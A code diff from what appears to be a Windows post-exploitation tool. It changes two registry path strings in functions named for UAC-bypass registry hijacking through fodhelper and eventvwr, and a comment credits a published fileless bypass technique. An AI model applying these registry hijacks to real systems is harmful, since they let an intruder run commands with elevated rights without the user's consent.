@@ -13,7 +13,7 @@ import os
 def registry_hijacking_fodhelper(cmd, params=""):
 
     HKCU            = ConnectRegistry(None, HKEY_CURRENT_USER)
-    fodhelperPath   = "Software\Classes\ms-settings\Shell\Open\command"
+    fodhelperPath   = r'Software\Classes\ms-settings\Shell\Open\command'
 
     if params:
         cmd = '%s %s'.strip() % (cmd, params)
@@ -52,7 +52,7 @@ def registry_hijacking_eventvwr(cmd, params=""):
     #   Based on Invoke-EventVwrBypass, thanks to enigma0x3 (https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)
     #   '''
     HKCU = ConnectRegistry(None, HKEY_CURRENT_USER)
-    mscCmdPath = "Software\Classes\mscfile\shell\open\command"
+    mscCmdPath = r'Software\Classes\mscfile\shell\open\command'
 
     if params:
         cmd = '%s %s'.strip() % (cmd, params)
